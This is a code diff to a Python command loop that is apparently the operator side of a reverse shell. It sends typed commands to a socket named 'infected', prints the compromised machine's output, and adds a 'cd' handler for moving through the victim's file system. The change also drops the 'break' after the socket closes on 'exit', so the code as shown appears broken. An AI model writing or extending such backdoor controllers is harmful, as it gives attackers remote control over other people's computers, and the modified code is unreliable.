@@ -33,8 +33,11 @@ while True:
 
     if 'exit' in command :
         s.close()
-        break
-    
+
+    elif command[:2] == 'cd':
+        infected.send(command.encode())
+        pwd = infected.recv(Size).decode()
+
     else:
         infected.send(command.encode())
         print (infected.recv(Size).decode())
